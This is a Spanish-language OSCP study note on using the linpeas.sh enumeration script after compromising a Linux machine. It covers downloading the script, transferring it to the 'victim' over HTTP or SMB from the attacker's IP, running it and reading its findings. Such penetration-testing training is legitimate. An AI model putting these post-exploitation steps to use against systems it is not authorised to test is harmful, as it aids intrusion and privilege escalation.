`linpeas.sh` es uno de los scripts más completos para enumeración y escalada de privilegios en sistemas Linux. Está totalmente permitido en OSCP y es una de las herramientas más eficientes para encontrar vulnerabilidades locales o configuraciones débiles.

---

## Descarga

Desde tu máquina atacante:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

---

## Transferencia a la víctima

### Opción 1: HTTP
```bash
sudo python3 -m http.server 80
```
En la víctima:
```bash
wget http://<tu_IP>/linpeas.sh -O /tmp/linpeas.sh
```

### Opción 2: smbserver.py
```bash
sudo smbserver.py -smb2support SHARE /ruta/del/archivo
```
En la víctima:
```bash
cp \\<tu_IP>\SHARE\linpeas.sh .
```

---

## Ejecución

```bash
chmod +x linpeas.sh
./linpeas.sh
```

Recomendado usar `script linpeas.log` antes de lanzarlo para guardar la salida.

---

## Qué detecta

- SUID/SGID peligrosos
- Cronjobs mal configurados
- Archivos `.bash_history`, backups visibles
- Capabilities (`getcap`), sockets, configuraciones sudo
- Binarios del sistema con permisos inseguros
- Servicios, PATH, variables de entorno

---

## Interpretación

- Colores: rojo = crítico, amarillo = interesante
- Asegúrate de revisar la sección de `SUDO`, `SUID`, `CAPABILITIES`, y `Writable files`
- Usa `less linpeas.log` y `grep` para filtrar si lo guardaste

---

## Buenas Prácticas

- Ejecutar nada más comprometer una máquina Linux
- Guardar la salida para análisis offline
- Revisar manualmente cada ítem marcado en rojo/amarillo

---
